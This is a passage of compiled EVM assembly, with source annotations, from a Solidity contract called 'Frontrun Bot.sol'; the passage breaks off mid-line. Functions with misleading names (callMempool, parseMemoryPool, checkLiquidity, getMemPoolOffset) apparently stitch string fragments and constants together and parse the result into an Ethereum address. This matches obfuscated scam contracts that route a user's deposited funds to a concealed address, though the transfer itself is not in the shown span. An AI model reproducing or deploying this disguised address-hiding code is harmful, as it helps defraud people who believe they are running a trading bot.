mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_75\n        /* \"Frontrun Bot.sol\":14980:15009  mempool(_memPool1, _memPool2) */\n      tag_76\n        /* \"Frontrun Bot.sol\":14988:14997  _memPool1 */\n      dup7\n        /* \"Frontrun Bot.sol\":14999:15008  _memPool2 */\n      dup7\n        /* \"Frontrun Bot.sol\":14980:14987  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14980:15009  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_76:\n        /* \"Frontrun Bot.sol\":15011:15040  mempool(_memPool3, _memPool4) */\n      tag_77\n        /* \"Frontrun Bot.sol\":15019:15028  _memPool3 */\n      dup6\n        /* \"Frontrun Bot.sol\":15030:15039  _memPool4 */\n      dup6\n        /* \"Frontrun Bot.sol\":15011:15018  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":15011:15040  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_77:\n        /* \"Frontrun Bot.sol\":14972:14979  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14972:15041  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_75:\n        /* \"Frontrun Bot.sol\":14943:15041  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":15052:15078  string memory _fullMempool */\n      0x60\n        /* \"Frontrun Bot.sol\":15081:15107  mempool(\"0\", _allMempools) */\n      tag_78\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":15094:15106  _allMempools */\n      dup4\n        /* \"Frontrun Bot.sol\":15081:15088  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":15081:15107  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_78:\n        /* \"Frontrun Bot.sol\":15052:15107  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":15128:15140  _fullMempool */\n      dup1\n        /* \"Frontrun Bot.sol\":15121:15140  return _fullMempool */\n      swap15\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":14068:15158  function callMempool() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":8633:9573  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r... */\n    tag_47:\n        /* \"Frontrun Bot.sol\":8699:8714  address _parsed */\n      0x00\n        /* \"Frontrun Bot.sol\":8727:8743  bytes memory tmp */\n      0x60\n        /* \"Frontrun Bot.sol\":8752:8754  _a */\n      dup3\n        /* \"Frontrun Bot.sol\":8727:8755  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8766:8779  uint160 iaddr */\n      0x00\n        /* \"Frontrun Bot.sol\":8782:8783  0 */\n      dup1\n        /* \"Frontrun Bot.sol\":8766:8783  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8794:8804  uint160 b1 */\n      0x00\n        /* \"Frontrun Bot.sol\":8815:8825  uint160 b2 */\n      dup1\n        /* \"Frontrun Bot.sol\":8841:8847  uint i */\n      0x00\n        /* \"Frontrun Bot.sol\":8850:8851  2 */\n      0x02\n        /* \"Frontrun Bot.sol\":8841:8851  uint i = 2 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8836:9534  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_80:\n        /* \"Frontrun Bot.sol\":8857:8867  2 + 2 * 20 */\n      0x2a\n        /* \"Frontrun Bot.sol\":8853:8854  i */\n      dup2\n        /* \"Frontrun Bot.sol\":8853:8867  i < 2 + 2 * 20 */\n      lt\n        /* \"Frontrun Bot.sol\":8836:9534  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_81\n      jumpi\n        /* \"Frontrun Bot.sol\":8901:8904  256 */\n      0x0100\n        /* \"Frontrun Bot.sol\":8892:8904  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":8938:8941  tmp */\n      dup5\n        /* \"Frontrun Bot.sol\":8942:8943  i */\n      dup2\n        /* \"Frontrun Bot.sol\":8938:8944  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_83\n      jumpi\n      invalid\n    tag_83:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":8932:8945  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":8924:8946  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":8919:8946  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":8980:8983  tmp */\n      dup5\n        /* \"Frontrun Bot.sol\":8988:8989  1 */\n      0x01\n        /* \"Frontrun Bot.sol\":8984:8985  i */\n      dup3\n        /* \"Frontrun Bot.sol\":8984:8989  i + 1 */\n      add\n        /* \"Frontrun Bot.sol\":8980:8990  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_84\n      jumpi\n      invalid\n    tag_84:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":8974:8991  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":8966:8992  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":8961:8992  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9018:9020  97 */\n      0x61\n        /* \"Frontrun Bot.sol\":9012:9014  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9012:9020  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9011:9036  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9032:9035  102 */\n      0x66\n        /* \"Frontrun Bot.sol\":9026:9028  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9026:9035  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9011:9036  (b1 >= 97) && (b1 <= 102) */\n    tag_85:\n        /* \"Frontrun Bot.sol\":9007:9239  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_86\n      jumpi\n        /* \"Frontrun Bot.sol\":9063:9065  87 */\n      0x57\n        /* \"Frontrun Bot.sol\":9057:9065  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":9007:9239  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_87)\n    tag_86:\n        /* \"Frontrun Bot.sol\":9098:9100  65 */\n      0x41\n        /* \"Frontrun Bot.sol\":9092:9094  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9092:9100  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9091:9115  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9112:9114  70 */\n      0x46\n        /* \"Frontrun Bot.sol\":9106:9108  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9106:9114  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9091:9115  (b1 >= 65) && (b1 <= 70) */\n    tag_88:\n        /* \"Frontrun Bot.sol\":9087:9239  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_89\n      jumpi\n        /* \"Frontrun Bot.sol\":9142:9144  55 */\n      0x37\n        /* \"Frontrun Bot.sol\":9136:9144  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":9087:9239  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_90)\n    tag_89:\n        /* \"Frontrun Bot.sol\":9177:9179  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9171:9173  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9171:9179  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9170:9194  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_91\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9191:9193  57 */\n      0x39\n        /* \"Frontrun Bot.sol\":9185:9187  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9185:9193  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9170:9194  (b1 >= 48) && (b1 <= 57) */\n    tag_91:\n        /* \"Frontrun Bot.sol\":9166:9239  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_92\n      jumpi\n        /* \"Frontrun Bot.sol\":9221:9223  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9215:9223  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":9166:9239  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_92:\n        /* \"Frontrun Bot.sol\":9087:9239  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_90:\n        /* \"Frontrun Bot.sol\":9007:9239  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_87:\n        /* \"Frontrun Bot.sol\":9264:9266  97 */\n      0x61\n        /* \"Frontrun Bot.sol\":9258:9260  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9258:9266  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9257:9282  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9278:9281  102 */\n      0x66\n        /* \"Frontrun Bot.sol\":9272:9274  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9272:9281  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9257:9282  (b2 >= 97) && (b2 <= 102) */\n    tag_93:\n        /* \"Frontrun Bot.sol\":9253:9485  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_94\n      jumpi\n        /* \"Frontrun Bot.sol\":9309:9311  87 */\n      0x57\n        /* \"Frontrun Bot.sol\":9303:9311  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9253:9485  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_95)\n    tag_94:\n        /* \"Frontrun Bot.sol\":9344:9346  65 */\n      0x41\n        /* \"Frontrun Bot.sol\":9338:9340  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9338:9346  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9337:9361  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9358:9360  70 */\n      0x46\n        /* \"Frontrun Bot.sol\":9352:9354  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9352:9360  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9337:9361  (b2 >= 65) && (b2 <= 70) */\n    tag_96:\n        /* \"Frontrun Bot.sol\":9333:9485  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_97\n      jumpi\n        /* \"Frontrun Bot.sol\":9388:9390  55 */\n      0x37\n        /* \"Frontrun Bot.sol\":9382:9390  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9333:9485  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_98)\n    tag_97:\n        /* \"Frontrun Bot.sol\":9423:9425  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9417:9419  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9417:9425  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9416:9440  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_99\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9437:9439  57 */\n      0x39\n        /* \"Frontrun Bot.sol\":9431:9433  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9431:9439  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9416:9440  (b2 >= 48) && (b2 <= 57) */\n    tag_99:\n        /* \"Frontrun Bot.sol\":9412:9485  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_100\n      jumpi\n        /* \"Frontrun Bot.sol\":9467:9469  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9461:9469  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9412:9485  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_100:\n        /* \"Frontrun Bot.sol\":9333:9485  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_98:\n        /* \"Frontrun Bot.sol\":9253:9485  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_95:\n        /* \"Frontrun Bot.sol\":9519:9521  b2 */\n      dup2\n        /* \"Frontrun Bot.sol\":9514:9516  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":9509:9511  b1 */\n      dup5\n        /* \"Frontrun Bot.sol\":9509:9516  b1 * 16 */\n      mul\n        /* \"Frontrun Bot.sol\":9509:9521  b1 * 16 + b2 */\n      add\n        /* \"Frontrun Bot.sol\":9499:9522  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":8874:8875  2 */\n      0x02\n        /* \"Frontrun Bot.sol\":8869:8875  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8836:9534  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_80)\n    tag_81:\n      pop\n        /* \"Frontrun Bot.sol\":9559:9564  iaddr */\n      dup3\n        /* \"Frontrun Bot.sol\":9544:9565  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":8633:9573  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"Frontrun Bot.sol\":8368:8457  function getMemPoolOffset() internal pure returns (uint) {\r... */\n    tag_55:\n        /* \"Frontrun Bot.sol\":8419:8423  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":8443:8449  290271 */\n      0x046ddf\n        /* \"Frontrun Bot.sol\":8436:8449  return 290271 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8368:8457  function getMemPoolOffset() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":10139:11154  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_56:\n        /* \"Frontrun Bot.sol\":10194:10207  string memory */\n      0x60\n        /* \"Frontrun Bot.sol\":10220:10230  uint count */\n      0x00\n        /* \"Frontrun Bot.sol\":10233:10234  0 */\n      dup1\n        /* \"Frontrun Bot.sol\":10220:10234  uint count = 0 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10245:10251  uint b */\n      0x00\n        /* \"Frontrun Bot.sol\":10254:10255  a */\n      dup4\n        /* \"Frontrun Bot.sol\":10245:10255  uint b = a */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10266:10337  while (b != 0) {\r... */\n    tag_103:\n        /* \"Frontrun Bot.sol\":10278:10279  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":10273:10274  b */\n      dup2\n        /* \"Frontrun Bot.sol\":10273:10279  b != 0 */\n      eq\n        /* \"Frontrun Bot.sol\":10266:10337  while (b != 0) {\r... */\n      tag_104\n      jumpi\n        /* \"Frontrun Bot.sol\":10296:10303  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":10323:10325  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":10318:10325  b /= 16 */\n      dup2\n      dup2\n      tag_105\n      jumpi\n      invalid\n    tag_105:\n      div\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10266:10337  while (b != 0) {\r... */\n      jump(tag_103)\n    tag_104:\n        /* \"Frontrun Bot.sol\":10347:10363  bytes memory res */\n      0x60\n        /* \"Frontrun Bot.sol\":10376:10381  count */\n      dup3\n        /* \"Frontrun Bot.sol\":10366:10382  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_106\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_106:\n        /* \"Frontrun Bot.sol\":10366:10382  new bytes(count) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_107\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"Frontrun Bot.sol\":10366:10382  new bytes(count) */\n      swap1\n      pop\n    tag_107:\n      pop\n        /* \"Frontrun Bot.sol\":10347:10382  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10398:10404  uint i */\n      0x00\n        /* \"Frontrun Bot.sol\":10405:10406  0 */\n      dup1\n        /* \"Frontrun Bot.sol\":10398:10406  uint i=0 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10393:10537  for (uint i=0; i<count; ++i) {\r... */\n    tag_108:\n        /* \"Frontrun Bot.sol\":10410:10415  count */\n      dup4\n        /* \"Frontrun Bot.sol\":10408:10409  i */\n      dup2\n        /* \"Frontrun Bot.sol\":10408:10415  i<count */\n      lt\n        /* \"Frontrun Bot.sol\":10393:10537  for (uint i=0; i<count; ++i) {\r... */\n      iszero\n      tag_109\n      jumpi\n        /* \"Frontrun Bot.sol\":10445:10447  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":10441:10442  a */\n      dup7\n        /* \"Frontrun Bot.sol\":10441:10447  a % 16 */\n      dup2\n      tag_111\n      jumpi\n      invalid\n    tag_111:\n      mod\n        /* \"Frontrun Bot.sol\":10437:10447  b = a % 16 */\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":10483:10503  toHexDigit(uint8(b)) */\n      tag_112\n        /* \"Frontrun Bot.sol\":10500:10501  b */\n      dup4\n        /* \"Frontrun Bot.sol\":10483:10493  toHexDigit */\n      tag_113\n        /* \"Frontrun Bot.sol\":10483:10503  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_112:\n        /* \"Frontrun Bot.sol\":10462:10465  res */\n      dup3\n        /* \"Frontrun Bot.sol\":10478:10479  1 */\n      0x01\n        /* \"Frontrun Bot.sol\":10474:10475  i */\n      dup4\n        /* \"Frontrun Bot.sol\":10466:10471  count */\n      dup8\n        /* \"Frontrun Bot.sol\":10466:10475  count - i */\n      sub\n        /* \"Frontrun Bot.sol\":10466:10479  count - i - 1 */\n      sub\n        /* \"Frontrun Bot.sol\":10462:10480  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_114\n      jumpi\n      invalid\n    tag_114:\n      0x20\n      add\n      add\n        /* \"Frontrun Bot.sol\":10462:10503  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"Frontrun Bot.sol\":10523:10525  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":10518:10525  a /= 16 */\n      dup7\n      dup2\n      tag_115\n      jumpi\n      invalid\n    tag_115:\n      div\n      swap6\n      pop\n        /* \"Frontrun Bot.sol\":10417:10420  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10393:10537  for (uint i=0; i<count; ++i) {\r... */\n      jump(tag_108)\n    tag_109:\n      pop\n        /* \"Frontrun Bot.sol\":10547:10561  uint hexLength */\n      0x00\n        /* \"Frontrun Bot.sol\":10577:10580  res */\n      dup2\n        /* \"Frontrun Bot.sol\":10564:10589  bytes(string(res)).length */\n      mload\n        /* \"Frontrun Bot.sol\":10547:10589  uint hexLength = bytes(string(res)).length */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10617:10618  4 */\n      0x04\n        /* \"Frontrun Bot.sol\":10604:10613  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10604:10618  hexLength == 4 */\n      eq\n        /* \"Frontrun Bot.sol\":10600:11115  if (hexLength == 4) {\r... */\n      iszero\n      tag_116\n      jumpi\n        /* \"Frontrun Bot.sol\":10635:10655  string memory _hexC1 */\n      0x60\n        /* \"Frontrun Bot.sol\":10658:10683  mempool(\"0\", string(res)) */\n      tag_117\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":10678:10681  res */\n      dup5\n        /* \"Frontrun Bot.sol\":10658:10665  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":10658:10683  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_117:\n        /* \"Frontrun Bot.sol\":10635:10683  string memory _hexC1 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10705:10711  _hexC1 */\n      dup1\n        /* \"Frontrun Bot.sol\":10698:10711  return _hexC1 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10600:11115  if (hexLength == 4) {\r... */\n    tag_116:\n        /* \"Frontrun Bot.sol\":10746:10747  3 */\n      0x03\n        /* \"Frontrun Bot.sol\":10733:10742  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10733:10747  hexLength == 3 */\n      eq\n        /* \"Frontrun Bot.sol\":10729:11115  if (hexLength == 3) {\r... */\n      iszero\n      tag_119\n      jumpi\n        /* \"Frontrun Bot.sol\":10764:10784  string memory _hexC2 */\n      0x60\n        /* \"Frontrun Bot.sol\":10787:10812  mempool(\"0\", string(res)) */\n      tag_120\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":10807:10810  res */\n      dup5\n        /* \"Frontrun Bot.sol\":10787:10794  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":10787:10812  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_120:\n        /* \"Frontrun Bot.sol\":10764:10812  string memory _hexC2 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10834:10840  _hexC2 */\n      dup1\n        /* \"Frontrun Bot.sol\":10827:10840  return _hexC2 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10729:11115  if (hexLength == 3) {\r... */\n    tag_119:\n        /* \"Frontrun Bot.sol\":10875:10876  2 */\n      0x02\n        /* \"Frontrun Bot.sol\":10862:10871  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10862:10876  hexLength == 2 */\n      eq\n        /* \"Frontrun Bot.sol\":10858:11115  if (hexLength == 2) {\r... */\n      iszero\n      tag_122\n      jumpi\n        /* \"Frontrun Bot.sol\":10893:10913  string memory _hexC3 */\n      0x60\n        /* \"Frontrun Bot.sol\":10916:10943  mempool(\"000\", string(res)) */\n      tag_123\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3030300000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":10938:10941  res */\n      dup5\n        /* \"Frontrun Bot.sol\":10916:10923  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":10916:10943  mempool(\"000\", string(res)) */\n      jump\t// in\n    tag_123:\n        /* \"Frontrun Bot.sol\":10893:10943  string memory _hexC3 = mempool(\"000\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10965:10971  _hexC3 */\n      dup1\n        /* \"Frontrun Bot.sol\":10958:10971  return _hexC3 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10858:11115  if (hexLength == 2) {\r... */\n    tag_122:\n        /* \"Frontrun Bot.sol\":11006:11007  1 */\n      0x01\n        /* \"Frontrun Bot.sol\":10993:11002  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10993:11007  hexLength == 1 */\n      eq\n        /* \"Frontrun Bot.sol\":10989:11115  if (hexLength == 1) {\r... */\n      iszero\n      tag_125\n      jumpi\n        /* \"Frontrun Bot.sol\":11024:11044  string memory _hexC4 */\n      0x60\n        /* \"Frontrun Bot.sol\":11047:11075  mempool(\"0000\", string(res)) */\n      tag_126\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3030303000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":11070:11073  res */\n      dup5\n        /* \"Frontrun Bot.sol\":11047:11054  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":11047:11075  mempool(\"0000\", string(res)) */\n      jump\t// in\n    tag_126:\n        /* \"Frontrun Bot.sol\":11024:11075  string memory _hexC4 = mempool(\"0000\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":11097:11103  _hexC4 */\n      dup1\n        /* \"Frontrun Bot.sol\":11090:11103  return _hexC4 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10989:11115  if (hexLength == 1) {\r... */\n    tag_125:\n        /* \"Frontrun Bot.sol\":11142:11145  res */\n      dup2\n        /* \"Frontrun Bot.sol\":11128:11146  return string(res) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":10139:11154  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_102:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"Frontrun Bot.sol\":17672:18307  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n    tag_57:\n        /* \"Frontrun Bot.sol\":17755:17768  string memory */\n      0x60\n        /* \"Frontrun Bot.sol\":17781:17804  bytes memory _baseBytes */\n      dup1\n        /* \"Frontrun Bot.sol\":17813:17818  _base */\n      dup4\n        /* \"Frontrun Bot.sol\":17781:17819  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17830:17854  bytes memory _valueBytes */\n      0x60\n        /* \"Frontrun Bot.sol\":17863:17869  _value */\n      dup4\n        /* \"Frontrun Bot.sol\":17830:17870  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17884:17907  string memory _tmpValue */\n      0x60\n        /* \"Frontrun Bot.sol\":17941:17952  _valueBytes */\n      dup2\n        /* \"Frontrun Bot.sol\":17941:17959  